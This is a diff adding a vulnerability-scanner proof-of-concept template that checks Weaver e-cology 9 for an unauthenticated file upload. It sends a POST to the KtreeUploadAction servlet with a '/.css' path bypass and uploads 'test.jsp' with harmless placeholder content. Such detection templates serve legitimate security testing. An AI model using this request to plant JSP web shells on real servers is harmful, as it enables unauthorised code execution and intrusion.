@@ -1,0 +1,25 @@
+name: poc-yaml-ecology9-KtreeUploadAction-file-upload
+transport: http
+set:
+  filename: b"test.jsp"
+  r1: b"\x0D"
+rules:
+  r0:
+    request:
+      method: POST
+      path: /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction/.css?action=image
+      body: |
+        ------WebKitFormBoundaryAe9cgNtm0PTABns7{{r1}}
+        Content-Disposition: form-data; name="filename"; filename="${{filename}}"{{r1}}
+        Content-Type: image/jpeg{{r1}}
+        {{r1}}
+        helloword{{r1}}
+        ------WebKitFormBoundaryAe9cgNtm0PTABns7--{{r1}}
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAe9cgNtm0PTABns7
+    expression: response.status == 200
+expression: r0()
+detail:
+  author: trganda
+  links:
+    - https://www.weaver.com.cn/cs/securityDownload.asp
